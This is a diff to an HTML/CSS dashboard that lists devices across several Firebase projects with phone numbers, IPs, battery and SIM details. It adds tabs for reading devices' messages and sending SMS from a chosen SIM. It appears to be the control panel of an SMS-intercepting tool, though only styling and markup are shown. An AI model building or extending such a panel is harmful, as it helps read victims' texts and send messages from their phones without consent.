@@ -33,12 +33,13 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
 @keyframes float{0%,100%{transform:translateY(0);}50%{transform:translateY(-8px);}}
 @keyframes shimmer{0%{background-position:-200% center;}100%{background-position:200% center;}}
 @keyframes pop{0%{transform:scale(.9);opacity:0;}60%{transform:scale(1.03);}100%{transform:scale(1);opacity:1;}}
+@keyframes newMsg{0%{transform:translateX(-8px);opacity:0;}100%{transform:translateX(0);opacity:1;}}
 
 #loginScreen{position:fixed;inset:0;z-index:10;display:flex;align-items:center;justify-content:center;padding:24px;}
 .login-box{width:100%;max-width:420px;background:var(--card);backdrop-filter:blur(24px) saturate(180%);-webkit-backdrop-filter:blur(24px) saturate(180%);border:1px solid var(--border-hi);border-radius:24px;padding:44px 38px 38px;position:relative;overflow:hidden;animation:fadeUp .6s cubic-bezier(.22,1,.36,1);box-shadow:0 30px 100px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.03) inset;}
 .login-box::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad);background-size:200% 100%;animation:shimmer 3s linear infinite;}
 .login-dots{position:absolute;top:20px;right:24px;display:flex;gap:6px;}
-.login-dots i{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,.08);}
+.login-dots i{width:8px;height:8px;border-radius:50%;}
 .login-dots i:nth-child(1){background:rgba(168,85,247,.6);}
 .login-dots i:nth-child(2){background:rgba(6,182,212,.6);}
 .login-dots i:nth-child(3){background:rgba(244,63,94,.6);}
@@ -46,13 +47,13 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
 .login-tag{text-align:center;font-size:11px;font-weight:600;letter-spacing:4px;text-transform:uppercase;color:var(--sub);margin-bottom:36px;}
 .login-field{margin-bottom:20px;}
 .login-field label{display:block;font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:8px;}
-.login-field input{width:100%;padding:15px 18px;background:rgba(10,14,26,.6);border:1px solid var(--border);border-radius:12px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:14px;outline:none;transition:all .25s cubic-bezier(.22,1,.36,1);}
+.login-field input{width:100%;padding:15px 18px;background:rgba(10,14,26,.6);border:1px solid var(--border);border-radius:12px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:14px;outline:none;transition:all .25s;}
 .login-field input:focus{border-color:rgba(168,85,247,.5);background:rgba(10,14,26,.9);box-shadow:0 0 0 4px rgba(168,85,247,.1);}
 .login-field input::placeholder{color:var(--dim);}
-.login-btn{width:100%;padding:16px;border:none;border-radius:12px;background:var(--grad);background-size:200% 100%;color:#fff;font-family:'Inter',sans-serif;font-size:15px;font-weight:700;letter-spacing:.3px;cursor:pointer;position:relative;overflow:hidden;transition:all .3s cubic-bezier(.22,1,.36,1);box-shadow:0 8px 32px rgba(168,85,247,.35);animation:shimmer 4s linear infinite;}
+.login-btn{width:100%;padding:16px;border:none;border-radius:12px;background:var(--grad);background-size:200% 100%;color:#fff;font-family:'Inter',sans-serif;font-size:15px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 8px 32px rgba(168,85,247,.35);animation:shimmer 4s linear infinite;}
 .login-btn:hover{transform:translateY(-2px);box-shadow:0 14px 44px rgba(168,85,247,.5);}
 .login-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
-.login-err{margin-top:16px;padding:12px 16px;background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.25);border-radius:10px;color:var(--rose);font-size:12px;font-weight:600;text-align:center;animation:fadeUp .3s ease;}
+.login-err{margin-top:16px;padding:12px 16px;background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.25);border-radius:10px;color:var(--rose);font-size:12px;font-weight:600;text-align:center;}
 .login-foot{margin-top:28px;padding-top:20px;border-top:1px solid var(--border);text-align:center;font-size:10px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--dim);}
 .login-foot span{background:var(--grad);background-size:200% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:shimmer 3s linear infinite;}
 
@@ -60,22 +61,22 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
 #dashboard.open{display:flex;}
 .topbar{height:58px;flex-shrink:0;display:flex;align-items:center;gap:16px;padding:0 24px;background:rgba(10,14,26,.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);position:relative;}
 .topbar::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(168,85,247,.4),rgba(6,182,212,.3),transparent);}
-.brand{font-family:'Space Grotesk',sans-serif;font-size:26px;font-weight:700;letter-spacing:-1.5px;background:var(--grad);background-size:200% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:shimmer 4s linear infinite;margin-right:8px;}
-.topbar-search{flex:1;max-width:400px;display:flex;align-items:center;gap:10px;padding:9px 14px;background:rgba(15,20,32,.6);border:1px solid var(--border);border-radius:10px;transition:all .2s;}
-.topbar-search:focus-within{border-color:rgba(168,85,247,.4);background:rgba(15,20,32,.9);box-shadow:0 0 0 3px rgba(168,85,247,.08);}
-.topbar-search svg{width:14px;height:14px;color:var(--dim);flex-shrink:0;}
+.brand{font-family:'Space Grotesk',sans-serif;font-size:26px;font-weight:700;letter-spacing:-1.5px;background:var(--grad);background-size:200% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:shimmer 4s linear infinite;}
+.topbar-search{flex:1;max-width:400px;display:flex;align-items:center;gap:10px;padding:9px 14px;background:rgba(15,20,32,.6);border:1px solid var(--border);border-radius:10px;}
+.topbar-search:focus-within{border-color:rgba(168,85,247,.4);background:rgba(15,20,32,.9);}
+.topbar-search svg{width:14px;height:14px;color:var(--dim);}
 .topbar-search input{flex:1;background:none;border:none;outline:none;color:var(--text);font-family:'Inter',sans-serif;font-size:13px;}
 .topbar-search input::placeholder{color:var(--dim);}
 .topbar-pills{display:flex;gap:6px;margin-left:auto;}
-.pill{font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;letter-spacing:.3px;display:inline-flex;align-items:center;gap:5px;}
+.pill{font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;display:inline-flex;align-items:center;gap:5px;}
 .pill b{font-weight:800;}
 .pill.tot{background:rgba(168,85,247,.12);color:var(--p);}
 .pill.on{background:rgba(16,185,129,.12);color:var(--emerald);}
 .pill.off{background:rgba(244,63,94,.1);color:var(--rose);}
 .pill.fb{background:rgba(6,182,212,.1);color:var(--c);}
 .live-dot{width:8px;height:8px;border-radius:50%;background:var(--emerald);box-shadow:0 0 10px var(--emerald);animation:pulse 2s infinite;}
-.icon-btn{width:34px;height:34px;display:flex;align-items:center;justify-content:center;background:rgba(20,25,40,.6);border:1px solid var(--border);border-radius:9px;color:var(--sub);cursor:pointer;transition:all .2s cubic-bezier(.22,1,.36,1);}
-.icon-btn:hover{color:var(--text);border-color:var(--border-hi);background:rgba(28,35,55,.8);transform:translateY(-1px);}
+.icon-btn{width:34px;height:34px;display:flex;align-items:center;justify-content:center;background:rgba(20,25,40,.6);border:1px solid var(--border);border-radius:9px;color:var(--sub);cursor:pointer;transition:all .2s;}
+.icon-btn:hover{color:var(--text);border-color:var(--border-hi);background:rgba(28,35,55,.8);}
 .icon-btn svg{width:15px;height:15px;}
 
 .body{display:flex;flex:1;overflow:hidden;}
@@ -84,17 +85,26 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
 .side-title{font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--dim);margin-bottom:10px;display:flex;align-items:center;gap:8px;}
 .side-title::after{content:'';flex:1;height:1px;background:var(--border);}
 .fb-list{display:flex;flex-direction:column;gap:4px;margin-bottom:8px;}
-.fb-item{padding:9px 12px;border-radius:9px;background:transparent;border:1px solid transparent;cursor:pointer;display:flex;align-items:center;gap:9px;font-size:12px;font-weight:600;color:var(--sub);transition:all .15s cubic-bezier(.22,1,.36,1);}
+.fb-item{padding:9px 12px;border-radius:9px;background:transparent;border:1px solid transparent;cursor:pointer;display:flex;align-items:center;gap:9px;font-size:12px;font-weight:600;color:var(--sub);transition:all .15s;}
 .fb-item:hover{background:rgba(255,255,255,.03);color:var(--text);}
 .fb-item.active{background:rgba(168,85,247,.1);border-color:rgba(168,85,247,.25);color:var(--text);}
 .fb-item .fdot{width:8px;height:8px;border-radius:50%;flex-shrink:0;background:var(--grad);}
 .fb-item .fname{flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
 .fb-item .fcount{font-size:10px;font-weight:700;padding:2px 7px;border-radius:5px;background:rgba(255,255,255,.05);color:var(--sub);}
 .fb-item.active .fcount{background:rgba(168,85,247,.2);color:var(--p);}
+
+.filter-chips{display:flex;gap:5px;padding:0 16px 10px;flex-shrink:0;}
+.fchip{flex:1;padding:7px 6px;background:rgba(15,20,32,.6);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-family:'Inter',sans-serif;font-size:10px;font-weight:700;cursor:pointer;transition:all .15s;text-align:center;text-transform:uppercase;}
+.fchip:hover{color:var(--text);border-color:var(--border-hi);}
+.fchip.active{background:rgba(168,85,247,.13);border-color:rgba(168,85,247,.3);color:var(--p);}
+.fchip.active.on{background:rgba(16,185,129,.13);border-color:rgba(16,185,129,.3);color:var(--emerald);}
+.fchip.active.off{background:rgba(244,63,94,.1);border-color:rgba(244,63,94,.3);color:var(--rose);}
+
 .dev-scroll{flex:1;overflow-y:auto;padding:4px 8px 8px;}
 .dev-empty{text-align:center;padding:50px 20px;color:var(--dim);font-size:12px;}
-.dev-item{padding:10px 12px;border-radius:10px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:all .15s cubic-bezier(.22,1,.36,1);border:1px solid transparent;}
+.dev-item{padding:10px 12px;border-radius:10px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:all .15s;border:1px solid transparent;}
 .dev-item:hover{background:rgba(255,255,255,.03);border-color:var(--border);}
+.dev-item.active{background:rgba(168,85,247,.08);border-color:rgba(168,85,247,.25);}
 .dev-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
 .dev-dot.on{background:var(--emerald);box-shadow:0 0 8px rgba(16,185,129,.7);animation:pulse 2s infinite;}
 .dev-dot.off{background:var(--dim);}
@@ -104,56 +114,72 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
 .dev-batt{font-size:10px;font-weight:700;padding:3px 7px;border-radius:6px;flex-shrink:0;}
 
 .main{flex:1;display:flex;flex-direction:column;overflow:hidden;}
-.main-inner{flex:1;overflow-y:auto;padding:26px 30px;}
+
+/* ─── TABS ─── */
+.tabs{display:flex;padding:0 24px;background:rgba(10,14,26,.5);border-bottom:1px solid var(--border);flex-shrink:0;overflow-x:auto;}
+.tabs::-webkit-scrollbar{height:2px;}
+.tab{padding:14px 20px;font-size:12px;font-weight:600;color:var(--sub);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap;position:relative;}
+.tab:hover{color:var(--text);}
+.tab.active{color:var(--text);border-bottom-color:var(--p);}
+.tab.active::after{content:'';position:absolute;bottom:-1px;left:20px;right:20px;height:2px;background:var(--grad);border-radius:2px;}
+
+.tab-body{flex:1;overflow-y:auto;padding:26px 30px;}
+.pane{display:none;}
+.pane.active{display:block;animation:fadeUp .25s ease;}
+
+/* Stats */
 .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px;}
-.stat{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:16px;padding:20px;position:relative;overflow:hidden;transition:all .3s cubic-bezier(.22,1,.36,1);animation:fadeUp .4s ease backwards;}
+.stat{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:16px;padding:20px;position:relative;overflow:hidden;transition:all .3s;}
 .stat:hover{transform:translateY(-3px);border-color:var(--border-hi);box-shadow:0 20px 50px rgba(0,0,0,.4);}
 .stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
 .stat.s1::before{background:linear-gradient(90deg,#a855f7,#c084fc);}
 .stat.s2::before{background:linear-gradient(90deg,#10b981,#34d399);}
 .stat.s3::before{background:linear-gradient(90deg,#f43f5e,#fb7185);}
 .stat.s4::before{background:linear-gradient(90deg,#06b6d4,#22d3ee);}
-.stat-val{font-family:'Space Grotesk',sans-serif;font-size:44px;font-weight:700;letter-spacing:-2px;line-height:1;margin-bottom:6px;animation:pop .5s cubic-bezier(.34,1.56,.64,1);}
+.stat-val{font-family:'Space Grotesk',sans-serif;font-size:44px;font-weight:700;letter-spacing:-2px;line-height:1;margin-bottom:6px;animation:pop .5s;}
 .stat.s1 .stat-val{color:#c084fc;}
 .stat.s2 .stat-val{color:#34d399;}
 .stat.s3 .stat-val{color:#fb7185;}
 .stat.s4 .stat-val{color:#22d3ee;}
 .stat-lbl{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);}
 
-.section{margin-bottom:26px;animation:fadeUp .4s ease backwards;animation-delay:.25s;}
 .section-head{display:flex;align-items:center;gap:12px;margin-bottom:14px;}
 .section-head h3{font-family:'Space Grotesk',sans-serif;font-size:13px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);}
 .section-head::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);}
 
 .dev-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px;}
-.dev-card{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:14px;padding:16px;cursor:pointer;position:relative;overflow:hidden;transition:all .25s cubic-bezier(.22,1,.36,1);}
-.dev-card:hover{transform:translateY(-3px);border-color:rgba(168,85,247,.35);box-shadow:0 16px 40px rgba(0,0,0,.4),0 0 0 1px rgba(168,85,247,.1);}
+.dev-card{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:14px;padding:16px;cursor:pointer;position:relative;overflow:hidden;transition:all .25s;}
+.dev-card:hover{transform:translateY(-3px);border-color:rgba(168,85,247,.35);box-shadow:0 16px 40px rgba(0,0,0,.4);}
 .dev-card-head{display:flex;align-items:flex-start;justify-content:space-between;gap:8px;margin-bottom:12px;}
 .dev-card-name{font-size:13px;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
 .dev-card-num{font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--sub);margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
-.dev-card-status{font-size:9px;font-weight:700;padding:3px 8px;border-radius:5px;letter-spacing:.5px;text-transform:uppercase;flex-shrink:0;}
+.dev-card-status{font-size:9px;font-weight:700;padding:3px 8px;border-radius:5px;text-transform:uppercase;flex-shrink:0;}
 .dev-card-status.on{background:rgba(16,185,129,.15);color:var(--emerald);}
 .dev-card-status.off{background:rgba(244,63,94,.1);color:var(--rose);}
 .dev-card-foot{display:flex;align-items:center;justify-content:space-between;padding-top:12px;border-top:1px solid var(--border);}
 .dev-batt-bar{flex:1;height:4px;background:rgba(255,255,255,.05);border-radius:4px;overflow:hidden;margin-right:10px;}
 .dev-batt-fill{height:100%;border-radius:4px;transition:width .5s;}
-.dev-batt-txt{font-size:10px;font-weight:700;font-family:'JetBrains Mono',monospace;flex-shrink:0;}
-.dev-card-fb{position:absolute;top:0;right:0;padding:3px 8px;font-size:8px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;border-radius:0 14px 0 10px;background:rgba(168,85,247,.15);color:var(--p);max-width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.dev-batt-txt{font-size:10px;font-weight:700;font-family:'JetBrains Mono',monospace;}
+.dev-card-fb{position:absolute;top:0;right:0;padding:3px 8px;font-size:8px;font-weight:800;text-transform:uppercase;border-radius:0 14px 0 10px;background:rgba(168,85,247,.15);color:var(--p);max-width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+
+.placeholder{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:80px 20px;color:var(--dim);gap:14px;}
+.placeholder .pi{font-size:54px;animation:float 4s ease-in-out infinite;}
+.placeholder p{font-size:13px;}
 
 .empty{text-align:center;padding:70px 20px;color:var(--dim);}
-.empty svg{width:48px;height:48px;margin-bottom:16px;opacity:.4;}
-.empty p{font-size:13px;font-weight:500;}
+.empty p{font-size:13px;}
 .loading{display:flex;align-items:center;justify-content:center;padding:80px 20px;gap:12px;color:var(--sub);font-size:13px;}
 .spinner{width:20px;height:20px;border-radius:50%;border:2px solid rgba(168,85,247,.2);border-top-color:var(--p);border-right-color:var(--c);animation:spin .8s linear infinite;}
 
-.detail-head{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;padding:24px;margin-bottom:20px;display:flex;align-items:center;gap:20px;position:relative;overflow:hidden;animation:fadeUp .4s ease;}
+/* Detail head */
+.detail-head{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;padding:24px;margin-bottom:20px;display:flex;align-items:center;gap:20px;position:relative;overflow:hidden;}
 .detail-head::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad);background-size:200% 100%;animation:shimmer 4s linear infinite;}
-.detail-icon{width:64px;height:64px;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:var(--grad);background-size:200% 100%;border-radius:18px;animation:float 4s ease-in-out infinite, shimmer 4s linear infinite;box-shadow:0 10px 30px rgba(168,85,247,.3);}
+.detail-icon{width:64px;height:64px;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:var(--grad);background-size:200% 100%;border-radius:18px;box-shadow:0 10px 30px rgba(168,85,247,.3);}
 .detail-icon svg{width:30px;height:30px;color:#fff;}
 .detail-meta{flex:1;min-width:0;}
 .detail-name{font-family:'Space Grotesk',sans-serif;font-size:24px;font-weight:700;letter-spacing:-.5px;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
 .detail-badges{display:flex;gap:6px;flex-wrap:wrap;}
-.dbadge{font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;letter-spacing:.3px;}
+.dbadge{font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;}
 .dbadge.on{background:rgba(16,185,129,.13);color:var(--emerald);}
 .dbadge.off{background:rgba(244,63,94,.1);color:var(--rose);}
 .dbadge.purp{background:rgba(168,85,247,.13);color:var(--p);}
@@ -162,37 +188,89 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
 .dbadge.lime{background:rgba(132,204,22,.13);color:var(--lime);}
 
 .detail-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-bottom:20px;}
-.dcard{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:13px;padding:16px;transition:all .2s;}
-.dcard:hover{border-color:var(--border-hi);transform:translateY(-2px);}
+.dcard{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:13px;padding:16px;}
+.dcard:hover{border-color:var(--border-hi);}
 .dcard-lbl{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--dim);margin-bottom:8px;}
 .dcard-val{font-size:15px;font-weight:700;color:var(--text);word-break:break-word;line-height:1.3;}
 .dcard-val.mono{font-family:'JetBrains Mono',monospace;font-size:12px;}
 .dcard-val.phone{font-family:'JetBrains Mono',monospace;font-size:16px;color:var(--c);}
 .dcard-val.ip{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--lime);}
 
+/* Messages */
+.msg-topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;}
+.msg-devname{font-size:14px;font-weight:700;}
+.msg-counter{font-size:11px;color:var(--sub);background:var(--bg3);border:1px solid var(--border);padding:3px 10px;border-radius:20px;}
+.live-badge{display:flex;align-items:center;gap:5px;font-size:10px;font-weight:700;color:var(--emerald);background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.2);padding:3px 9px;border-radius:20px;}
+.live-badge .ld{width:6px;height:6px;border-radius:50%;background:var(--emerald);animation:pulse 1.5s infinite;}
+.msg-refresh-btn{padding:5px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-family:'Inter',sans-serif;font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;}
+.msg-refresh-btn:hover{color:var(--text);border-color:var(--border-hi);}
+
+.msg-sim-bar{display:flex;gap:8px;margin-bottom:12px;background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:12px 14px;}
+.msb-sim{flex:1;display:flex;align-items:center;gap:8px;}
+.msb-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.msb-dot.s1{background:var(--c);box-shadow:0 0 6px var(--c);}
+.msb-dot.s2{background:var(--p);box-shadow:0 0 6px var(--p);}
+.msb-info{flex:1;min-width:0;}
+.msb-label{font-size:9px;font-weight:700;text-transform:uppercase;color:var(--dim);margin-bottom:3px;}
+.msb-num{font-size:13px;font-weight:700;font-family:'JetBrains Mono',monospace;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.msb-carrier{font-size:10px;color:var(--sub);}
+.msb-divider{width:1px;background:var(--border);margin:0 4px;}
+
+.msg-bar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;align-items:center;}
+.msg-sbox{flex:1;min-width:180px;display:flex;align-items:center;gap:8px;background:var(--bg2);border:1px solid var(--border);border-radius:9px;padding:8px 12px;}
+.msg-sbox:focus-within{border-color:rgba(168,85,247,.35);}
+.msg-sbox input{flex:1;background:none;border:none;outline:none;color:var(--text);font-family:'Inter',sans-serif;font-size:13px;}
+.msg-sbox input::placeholder{color:var(--dim);}
+.mfbtn{padding:8px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:9px;color:var(--sub);font-family:'Inter',sans-serif;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s;}
+.mfbtn.ma{background:rgba(168,85,247,.12);border-color:rgba(168,85,247,.3);color:var(--p);}
+.mfbtn:hover:not(.ma){color:var(--text);border-color:var(--border-hi);}
+
 .msg-list{display:flex;flex-direction:column;gap:10px;}
 .msg{background:var(--card);backdrop-filter:blur(20px);border:1px solid var(--border);border-left:3px solid var(--p);border-radius:13px;padding:16px 18px;transition:all .2s;}
 .msg.in{border-left-color:var(--c);}
 .msg.out{border-left-color:var(--emerald);}
 .msg:hover{transform:translateX(4px);border-color:var(--border-hi);}
+.msg.new{animation:newMsg .4s ease;}
 .msg-head{display:flex;align-items:center;gap:10px;margin-bottom:8px;flex-wrap:wrap;}
 .msg-from{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:700;color:var(--text);}
-.msg-type{font-size:9px;font-weight:800;padding:3px 8px;border-radius:5px;letter-spacing:.5px;text-transform:uppercase;}
+.msg-type{font-size:9px;font-weight:800;padding:3px 8px;border-radius:5px;text-transform:uppercase;}
 .msg-type.in{background:rgba(6,182,212,.15);color:var(--c);}
 .msg-type.out{background:rgba(16,185,129,.13);color:var(--emerald);}
 .msg-time{font-size:10px;color:var(--dim);font-family:'JetBrains Mono',monospace;margin-left:auto;}
 .msg-text{font-size:14px;line-height:1.6;color:#cbd5e1;word-break:break-word;}
 
-.overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:500;padding:20px;}
-.overlay.open{display:flex;}
-.modal{background:var(--bg2);border:1px solid var(--border-hi);border-radius:20px;padding:28px;width:100%;max-width:820px;max-height:90vh;overflow-y:auto;box-shadow:0 40px 100px rgba(0,0,0,.7);animation:pop .25s cubic-bezier(.34,1.56,.64,1);position:relative;}
-.modal::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad2);background-size:200% 100%;animation:shimmer 2s linear infinite;}
-.modal-title{font-family:'Space Grotesk',sans-serif;font-size:20px;font-weight:700;margin-bottom:20px;}
-.modal-btns{display:flex;gap:8px;margin-top:20px;}
-.mc{flex:1;padding:11px;background:rgba(20,25,40,.6);border:1px solid var(--border);border-radius:9px;color:var(--sub);font-family:'Inter',sans-serif;font-weight:600;cursor:pointer;font-size:13px;transition:all .15s;}
-.mc:hover{color:var(--text);border-color:var(--border-hi);}
+/* Send SMS */
+.send-wrap{max-width:580px;}
+.send-card{background:var(--bg2);border:1px solid var(--border);border-radius:18px;padding:28px;position:relative;overflow:hidden;margin-bottom:16px;}
+.send-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#10b981,#06b6d4,#a855f7,#10b981);background-size:200% 100%;animation:shimmer 2.5s linear infinite;}
+.send-title{font-size:18px;font-weight:800;margin-bottom:4px;}
+.send-sub{font-size:12px;color:var(--sub);margin-bottom:22px;}
+.dev-disp{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:12px 15px;margin-bottom:18px;display:flex;align-items:center;gap:10px;}
+.dd-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.dd-name{font-size:13px;font-weight:600;flex:1;}
+.dd-id{font-size:10px;color:var(--sub);font-family:'JetBrains Mono',monospace;}
+.sim-tog{display:flex;gap:8px;margin-bottom:18px;}
+.sim-col{flex:1;display:flex;flex-direction:column;gap:6px;}
+.stb{width:100%;padding:10px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:10px;color:var(--sub);font-family:'Inter',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;text-align:left;}
+.stb.s1{background:rgba(6,182,212,.12);border-color:rgba(6,182,212,.3);color:var(--c);}
+.stb.s2{background:rgba(168,85,247,.12);border-color:rgba(168,85,247,.3);color:var(--p);}
+.sim-numrow{display:flex;align-items:center;gap:6px;padding:0 2px;}
+.sim-numtxt{font-size:12px;font-family:'JetBrains Mono',monospace;font-weight:600;color:var(--sub);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.copybtn{padding:3px 9px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;color:var(--dim);font-family:'Inter',sans-serif;font-size:10px;font-weight:700;cursor:pointer;}
+.copybtn:hover{color:var(--text);}
+.send-inp,.send-area{width:100%;padding:12px 15px;background:var(--bg3);border:1px solid var(--border);border-radius:10px;color:var(--text);font-family:'Inter',sans-serif;font-size:14px;outline:none;}
+.send-inp{margin-bottom:11px;}
+.send-area{resize:vertical;min-height:100px;margin-bottom:16px;line-height:1.5;}
+.send-inp:focus,.send-area:focus{border-color:var(--p);}
+.send-inp::placeholder,.send-area::placeholder{color:var(--dim);}
+.send-btn{width:100%;padding:14px;border:none;border-radius:11px;color:#000;font-family:'Inter',sans-serif;font-size:15px;font-weight:800;cursor:pointer;background:linear-gradient(135deg,#10b981,#34d399);box-shadow:0 4px 24px rgba(16,185,129,.3);transition:all .2s;}
+.send-btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(16,185,129,.4);}
+.send-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+.send-res{margin-top:12px;padding:12px 16px;border-radius:10px;font-size:13px;font-weight:600;display:none;}
+.res-ok{background:rgba(16,185,129,.1);color:var(--emerald);border:1px solid rgba(16,185,129,.2);}
+.res-err{background:rgba(244,63,94,.09);color:var(--rose);border:1px solid rgba(244,63,94,.18);}
 
-.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(16px);background:rgba(20,25,40,.95);backdrop-filter:blur(20px);border:1px solid var(--border-hi);color:var(--text);font-size:13px;font-weight:600;padding:12px 24px;border-radius:14px;z-index:999;opacity:0;transition:all .3s cubic-bezier(.34,1.56,.64,1);pointer-events:none;white-space:nowrap;box-shadow:0 10px 40px rgba(0,0,0,.6);}
+.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(16px);background:rgba(20,25,40,.95);backdrop-filter:blur(20px);border:1px solid var(--border-hi);color:var(--text);font-size:13px;font-weight:600;padding:12px 24px;border-radius:14px;z-index:999;opacity:0;transition:all .3s;pointer-events:none;white-space:nowrap;box-shadow:0 10px 40px rgba(0,0,0,.6);}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
 </style>
 </head>
@@ -242,6 +320,14 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
         <div class="side-title">Firebases</div>
         <div class="fb-list" id="fbList"></div>
       </div>
+      <div class="side-sec" style="padding-top:0;padding-bottom:6px;">
+        <div class="side-title">Filter</div>
+      </div>
+      <div class="filter-chips">
+        <button class="fchip active" data-f="all">All</button>
+        <button class="fchip" data-f="online">On</button>
+        <button class="fchip" data-f="offline">Off</button>
+      </div>
       <div class="side-sec" style="padding-top:0;">
         <div class="side-title">Devices</div>
       </div>
@@ -250,17 +336,103 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
       </div>
     </aside>
     <main class="main">
-      <div class="main-inner">
-        <div class="stats">
-          <div class="stat s1"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">Total Devices</div></div>
-          <div class="stat s2"><div class="stat-val" id="stOnline">0</div><div class="stat-lbl">Online</div></div>
-          <div class="stat s3"><div class="stat-val" id="stOffline">0</div><div class="stat-lbl">Offline</div></div>
-          <div class="stat s4"><div class="stat-val" id="stSims">0</div><div class="stat-lbl">Total SIMs</div></div>
-        </div>
-        <div class="section">
+      <div class="tabs">
+        <div class="tab active" data-tab="overview">Overview</div>
+        <div class="tab" data-tab="device">📱 Device</div>
+        <div class="tab" data-tab="messages">💬 Messages</div>
+        <div class="tab" data-tab="sendsms">📤 Send SMS</div>
+      </div>
+      <div class="tab-body">
+        <div class="pane active" id="pane-overview">
+          <div class="stats">
